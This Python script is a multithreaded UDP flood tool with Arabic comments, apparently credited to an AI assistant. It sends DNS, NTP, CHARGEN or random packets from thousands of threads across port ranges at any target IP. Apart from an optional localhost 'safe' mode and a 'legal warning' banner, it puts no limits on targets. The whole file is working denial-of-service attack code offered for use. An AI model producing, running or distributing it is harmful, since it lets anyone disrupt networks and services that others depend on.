#!/usr/bin/env python3
# AI-Optimized UDP Flood Tester for High-Performance Testing
# Author: AI Security Assistant
# For Authorized Security Testing Only

import argparse
import random
import socket
import threading
import time
import sys
import struct
import ipaddress
import os
from dataclasses import dataclass
from typing import List, Tuple, Optional
import logging
import select

# ==================== HIGH-PERFORMANCE UDP CONFIG ====================

class UDPConfig:
    """إعدادات أداء UDP المثلى"""
    # إعدادات Socket
    SOCKET_BUFFER_SIZE = 65535
    SOCKET_TIMEOUT = 0.1
    REUSE_ADDRESS = True
    NON_BLOCKING = True
    
    # إعدادات الحزم
    MIN_PACKET_SIZE = 512  # الحد الأدنى لحجم الحزمة لتحقيق أداء أفضل
    MAX_PACKET_SIZE = 1400  # تجنب تجزئة حزم IP
    OPTIMAL_PACKET_SIZE = 1024  # الحجم الأمثل
    
    # إعدادات الأداء
    MAX_THREADS = 50000
    PACKETS_PER_BATCH = 100  # إرسال دفعات من الحزم
    USE_RAW_SOCKET = False  # لاستخدام Raw Socket (يتطلب صلاحيات root)
    
    # أنواع الحزم
    PACKET_TYPES = ['RANDOM', 'DNS', 'NTP', 'CHARGEN', 'CUSTOM']
    
    @staticmethod
    def optimize_system():
        """تحسين إعدادات النظام للأداء العالي"""
        try:
            # زيادة حدود نظام الملفات
            import resource
            resource.setrlimit(resource.RLIMIT_NOFILE, (999999, 999999))
            print("[*] System limits optimized")
        except:
            pass

# ==================== UDP PACKET GENERATOR ====================

class UDPPacketGenerator:
    """مولد حزم UDP متقدمة"""
    
    def __init__(self):
        self.packet_cache = {}
        self.custom_payload = None
        
    def generate_dns_packet(self) -> bytes:
        """إنشاء حزمة DNS مقلدة"""
        # رأس DNS
        transaction_id = random.randint(0, 65535)
        flags = 0x0100  # طلب قياسي
        questions = 1
        answer_rrs = 0
        authority_rrs = 0
        additional_rrs = 0
        
        # بناء الحزمة
        packet = struct.pack('!HHHHHH', 
                           transaction_id, flags, 
                           questions, answer_rrs, 
                           authority_rrs, additional_rrs)
        
        # اسم النطاق العشوائي
        domains = ['google.com', 'facebook.com', 'youtube.com', 
                  'twitter.com', 'instagram.com', 'test.com']
        domain = random.choice(domains)
        
        # ترميز اسم النطاق
        for part in domain.split('.'):
            packet += struct.pack('B', len(part))
            packet += part.encode()
        packet += b'\x00'  # نهاية الاسم
        
        # نوع وسجل الاستعلام
        packet += struct.pack('!HH', 1, 1)  # Type A, Class IN
        
        return packet
    
    def generate_ntp_packet(self) -> bytes:
        """إنشاء حزمة NTP مقلدة"""
        # رأس NTP
        li_vn_mode = (0 << 6) | (4 << 3) | (3)  # إصدار 4، وضع العميل
        stratum = 1
        poll = 10
        precision = 0xfa
        
        packet = struct.pack('!BBBB I I I I I I I I',
                           li_vn_mode, stratum, poll, precision,
                           0, 0, 0, 0, 0, 0, 0, 0)
        
        # timestamp
        import datetime
        now = datetime.datetime.utcnow()
        ntp_time = int(now.timestamp()) + 2208988800
        
        packet += struct.pack('!I I', ntp_time >> 32, ntp_time & 0xFFFFFFFF)
        
        return packet
    
    def generate_chargen_packet(self) -> bytes:
        """إنشاء حزمة CHARGEN مقلدة"""
        # حزمة CHARGEN قياسية
        chars = b"!\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~"
        length = random.randint(100, 1000)
        return chars * (length // len(chars)) + chars[:length % len(chars)]
    
    def generate_smart_packet(self, packet_type: str = 'RANDOM', size: int = None) -> bytes:
        """إنشاء حزمة ذكية بناءً على النوع"""
        if size is None:
            size = UDPConfig.OPTIMAL_PACKET_SIZE
            
        cache_key = f"{packet_type}_{size}"
        if cache_key in self.packet_cache:
            return self.packet_cache[cache_key]
        
        if packet_type == 'DNS':
            packet = self.generate_dns_packet()
        elif packet_type == 'NTP':
            packet = self.generate_ntp_packet()
        elif packet_type == 'CHARGEN':
            packet = self.generate_chargen_packet()
        elif packet_type == 'CUSTOM' and self.custom_payload:
            packet = self.custom_payload[:size]
        else:
            # حزمة عشوائية محسنة
            if size < 100:
                # حزم صغيرة: استخدام بيانات هيكلية
                packet = struct.pack('!Q', random.getrandbits(64)) * (size // 8)
                packet += random._urandom(size % 8)
            else:
                # حزم كبيرة: استخدام نمط أكثر كفاءة
                pattern = random._urandom(64)
                packet = (pattern * ((size // 64) + 1))[:size]
        
        # تخزين مؤقت للحزم المتكررة
        if len(packet) <= UDPConfig.MAX_PACKET_SIZE:
            self.packet_cache[cache_key] = packet
        
        return packet[:size]

# ==================== HIGH-PERFORMANCE UDP ENGINE ====================

class HighPerfUDPEngine:
    """محرك UDP عالي الأداء"""
    
    def __init__(self, target_ip: str, target_ports: Tuple[int, int]):
        self.target_ip = target_ip
        self.min_port, self.max_port = target_ports
        self.running = False
        self.packet_counter = 0
        self.byte_counter = 0
        self.start_time = 0
        self.packet_generator = UDPPacketGenerator()
        self.sockets = []
        
        # إحصائيات متقدمة
        self.stats = {
            'packets_sent': 0,
            'bytes_sent': 0,
            'errors': 0,
            'ports_hit': set(),
            'packet_types': {}
        }
        
        # تحسين النظام
        UDPConfig.optimize_system()
    
    def create_optimized_socket(self) -> socket.socket:
        """إنشاء socket محسن للأداء العالي"""
        try:
            # إنشاء socket UDP
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            # إعدادات الأداء
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 
                          UDPConfig.SOCKET_BUFFER_SIZE)
            
            # إعدادات إضافية للأداء
            if UDPConfig.NON_BLOCKING:
                sock.setblocking(0)
            
            if UDPConfig.REUSE_ADDRESS:
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            
            # استخدام Raw Socket إذا كان متاحاً
            if UDPConfig.USE_RAW_SOCKET and hasattr(socket, 'SOCK_RAW'):
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, 
                                       socket.IPPROTO_UDP)
                    print("[*] Using raw socket mode (requires root)")
                except:
                    pass
            
            return sock
        except Exception as e:
            print(f"[!] Socket creation error: {e}")
            # الرجوع إلى socket عادي
            return socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    def send_burst(self, sock: socket.socket, port: int, 
                  packet_type: str, burst_size: int = 10):
        """إرسال دفعة من الحزم لزيادة الأداء"""
        target = (self.target_ip, port)
        packets = []
        
        # توليد حزم مسبقاً
        for _ in range(burst_size):
            size = random.randint(UDPConfig.MIN_PACKET_SIZE, 
                                UDPConfig.MAX_PACKET_SIZE)
            packet = self.packet_generator.generate_smart_packet(packet_type, size)
            packets.append(packet)
        
        # إرسال الدفعة
        sent_count = 0
        for packet in packets:
            try:
                sock.sendto(packet, target)
                sent_count += 1
                self.packet_counter += 1
                self.byte_counter += len(packet)
                
                # تحديث الإحصائيات
                self.stats['packets_sent'] += 1
                self.stats['bytes_sent'] += len(packet)
                self.stats['ports_hit'].add(port)
                
                if packet_type in self.stats['packet_types']:
                    self.stats['packet_types'][packet_type] += 1
                else:
                    self.stats['packet_types'][packet_type] = 1
                    
            except (BlockingIOError, socket.error):
                self.stats['errors'] += 1
                break
        
        return sent_count
    
    def attack_worker(self, worker_id: int, packet_type: str, 
                     use_fixed_port: bool = False, 
                     burst_size: int = UDPConfig.PACKETS_PER_BATCH):
        """عامل هجوم UDP عالي الأداء"""
        # إنشاء sockets متعددة لكل عامل
        sockets = [self.create_optimized_socket() for _ in range(3)]
        
        # اختيار المنفذ
        if use_fixed_port or self.min_port == self.max_port:
            target_port = self.min_port
        else:
            target_port = random.randint(self.min_port, self.max_port)
        
        print(f"[Worker {worker_id}] Targeting port {target_port} with {packet_type}")
        
        # دورة الهجوم الرئيسية
        while self.running:
            try:
                # اختيار socket عشوائي
                sock = random.choice(sockets)
                
                # إرسال دفعة
                sent = self.send_burst(sock, target_port, packet_type, burst_size)
                
                if sent > 0:
                    # عرض التقدم كل 1000 حزمة
                    if self.packet_counter % 1000 == 0:
                        self.show_progress(worker_id)
                
                # تأخير قصير للحفاظ على الاستقرار
                if worker_id % 10 == 0:  # تقليل الحمل على العمال المميزين
                    time.sleep(0.001)
                
                # تغيير المنفذ بشكل دوري إذا كان النطاق واسعاً
                if not use_fixed_port and self.packet_counter % 100 == 0:
                    target_port = random.randint(self.min_port, self.max_port)
                
                # تغيير نوع الحزمة بشكل دوري
                if self.packet_counter % 500 == 0:
                    packet_type = random.choice(UDPConfig.PACKET_TYPES)
                    
            except Exception as e:
                if worker_id == 0:  # تسجيل الخطأ من عامل واحد فقط
                    print(f"[Worker {worker_id}] Error: {e}")
                time.sleep(0.1)
        
        # تنظيف sockets
        for sock in sockets:
            try:
                sock.close()
            except:
                pass
    
    def show_progress(self, worker_id: int = 0):
        """عرض تقدم الهجوم"""
        elapsed = time.time() - self.start_time
        if elapsed > 0:
            pps = self.packet_counter / elapsed  # حزم في الثانية
            mbps = (self.byte_counter * 8) / (elapsed * 1000000)  # ميغابت في الثانية
            
            print(f"\r[Stats] Pkts: {self.packet_counter:,} | "
                  f"Speed: {pps:,.0f} pps | {mbps:.2f} Mbps | "
                  f"Ports: {len(self.stats['ports_hit'])} | "
                  f"Workers: {threading.active_count()-1}", end="")
            sys.stdout.flush()
    
    def start_attack(self, threads: int, packet_type: str = 'RANDOM',
                    duration: int = None, burst_size: int = 50):
        """بدء هجوم UDP عالي الأداء"""
        self.running = True
        self.start_time = time.time()
        self.packet_counter = 0
        self.byte_counter = 0
        
        print(f"\n{'='*60}")
        print(f"🚀 HIGH-PERFORMANCE UDP FLOOD TEST")
        print(f"🎯 Target: {self.target_ip}")
        print(f"📌 Ports: {self.min_port} - {self.max_port}")
        print(f"🧵 Threads: {threads}")
        print(f"📦 Packet Type: {packet_type}")
        print(f"💥 Burst Size: {burst_size}")
        print(f"{'='*60}\n")
        
        # إنشاء خيوط الهجوم
        thread_pool = []
        for i in range(min(threads, UDPConfig.MAX_THREADS)):
            t = threading.Thread(
                target=self.attack_worker,
                args=(i, packet_type, self.min_port == self.max_port, burst_size),
                daemon=True
            )
            t.start()
            thread_pool.append(t)
        
        # مؤشر التقدم
        progress_thread = threading.Thread(target=self._progress_monitor, daemon=True)
        progress_thread.start()
        
        # التحكم في المدة
        try:
            if duration:
                print(f"[*] Attack will run for {duration} seconds")
                time.sleep(duration)
                self.stop_attack()
            else:
                print("[*] Press Ctrl+C to stop the attack")
                while self.running:
                    time.sleep(1)
        except KeyboardInterrupt:
            print("\n[*] Stopping attack...")
            self.stop_attack()
        
        # الانتظار لإنهاء جميع الخيوط
        for t in thread_pool:
            t.join(timeout=1)
        
        # عرض النتائج النهائية
        self.show_final_stats()
    
    def _progress_monitor(self):
        """مراقب التقدم"""
        while self.running:
            self.show_progress()
            time.sleep(0.5)
    
    def stop_attack(self):
        """إيقاف الهجوم"""
        self.running = False
    
    def show_final_stats(self):
        """عرض الإحصائيات النهائية"""
        elapsed = time.time() - self.start_time
        
        print(f"\n{'='*60}")
        print("📊 ATTACK COMPLETED - FINAL STATISTICS")
        print(f"{'='*60}")
        print(f"⏱️  Duration: {elapsed:.2f} seconds")
        print(f"📦 Total Packets: {self.packet_counter:,}")
        print(f"💾 Total Bytes: {self.byte_counter:,} ({self.byte_counter/1024/1024:.2f} MB)")
        
        if elapsed > 0:
            print(f"⚡ Average Speed: {self.packet_counter/elapsed:,.0f} packets/sec")
            print(f"📡 Bandwidth: {(self.byte_counter*8)/(elapsed*1000000):.2f} Mbps")
        
        print(f"🎯 Ports Hit: {len(self.stats['ports_hit'])}")
        print(f"❌ Errors: {self.stats['errors']}")
        
        # أنواع الحزم المستخدمة
        if self.stats['packet_types']:
            print("\n📋 Packet Types Distribution:")
            for ptype, count in self.stats['packet_types'].items():
                percentage = (count / self.packet_counter) * 100
                print(f"  {ptype}: {count:,} packets ({percentage:.1f}%)")
        
        print(f"{'='*60}")

# ==================== COMMAND LINE INTERFACE ====================

def parse_arguments():
    """تحليل وسائط سطر الأوامر"""
    parser = argparse.ArgumentParser(
        description="🚀 AI-Optimized UDP Flood Tester for High-Performance Security Testing",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
⚠️  LEGAL WARNING:
This tool is for AUTHORIZED SECURITY TESTING ONLY.
Unauthorized use against systems you do not own or have explicit
permission to test is ILLEGAL and punishable by law.

Examples:
  # Test local server (safe mode)
  %(prog)s -i 127.0.0.1 -p 80 -t 1000 -d 10 --safe
  
  # High-performance test with DNS packets
  %(prog)s -i 192.168.1.100 -p 1-1000 -t 5000 --type DNS --burst 100
  
  # Maximum performance test
  %(prog)s -i 10.0.0.1 -p 0 -t 20000 --burst 200 --raw
        """
    )
    
    parser.add_argument("-i", "--ip", required=True,
                       help="Target IP address")
    parser.add_argument("-p", "--port", default="80",
                       help="Port range (e.g., 80, 1-100, or 0 for all)")
    parser.add_argument("-t", "--threads", type=int, default=1000,
                       help="Number of attack threads (default: 1000)")
    parser.add_argument("-d", "--duration", type=int,
                       help="Attack duration in seconds (optional)")
    parser.add_argument("--type", default="RANDOM",
                       choices=UDPConfig.PACKET_TYPES,
                       help="Packet type to use (default: RANDOM)")
    parser.add_argument("--burst", type=int, default=50,
                       help="Packets per burst (default: 50)")
    parser.add_argument("--safe", action="store_true",
                       help="Safe mode - only allow localhost testing")
    parser.add_argument("--raw", action="store_true",
                       help="Use raw sockets (requires root)")
    parser.add_argument("--verbose", action="store_true",
                       help="Verbose output")
    
    return parser.parse_args()

def validate_target(args):
    """التحقق من صحة الهدف"""
    try:
        ip_obj = ipaddress.ip_address(args.ip)
        
        if args.safe:
            if not ip_obj.is_loopback:
                print("[!] Safe mode requires localhost (127.0.0.1)")
                return False
        
        if ip_obj.is_private and not ip_obj.is_loopback:
            print("[!] WARNING: Targeting private IP address")
            response = input("[?] Continue? (y/N): ")
            if response.lower() != 'y':
                return False
        
        if ip_obj.is_multicast or ip_obj.is_reserved:
            print("[!] Invalid target IP address")
            return False
        
        return True
    except ValueError:
        print("[!] Invalid IP address format")
        return False

def main():
    """الدالة الرئيسية"""
    print("""
    ╔══════════════════════════════════════════════════════════╗
    ║      🚀 AI-OPTIMIZED UDP FLOOD TESTER 🚀                ║
    ║      For Authorized Security Testing Only                ║
    ║      ⚠️  Use Responsibly and Legally ⚠️                 ║
    ╚══════════════════════════════════════════════════════════╝
    """)
    
    args = parse_arguments()
    
    # التحقق من الهدف
    if not validate_target(args):
        sys.exit(1)
    
    # تحليل المنافذ
    if args.port == "0":
        port_range = (1, 65535)
    elif "-" in args.port:
        try:
            min_p, max_p = map(int, args.port.split("-"))
            port_range = (min_p, max_p)
        except:
            port_range = (1, 1000)
    else:
        try:
            port = int(args.port)
            port_range = (port, port)
        except:
            port_range = (80, 80)
    
    # إعدادات Raw Socket
    if args.raw:
        UDPConfig.USE_RAW_SOCKET = True
        if os.name == 'posix' and os.geteuid() != 0:
            print("[!] Raw socket mode requires root privileges!")
            sys.exit(1)
    
    # إعدادات verbose
    if args.verbose:
        logging.basicConfig(level=logging.INFO)
    
    # إنشاء محرك الهجوم
    engine = HighPerfUDPEngine(args.ip, port_range)
    
    # بدء الهجوم
    try:
        engine.start_attack(
            threads=args.threads,
            packet_type=args.type,
            duration=args.duration,
            burst_size=args.burst
        )
    except KeyboardInterrupt:
        print("\n\n[*] Test stopped by user")
    except Exception as e:
        print(f"[!] Error: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    # تحسين إعدادات النظام
    try:
        import resource
        resource.setrlimit(resource.RLIMIT_NOFILE, (999999, 999999))
    except:
        pass
    
    main()
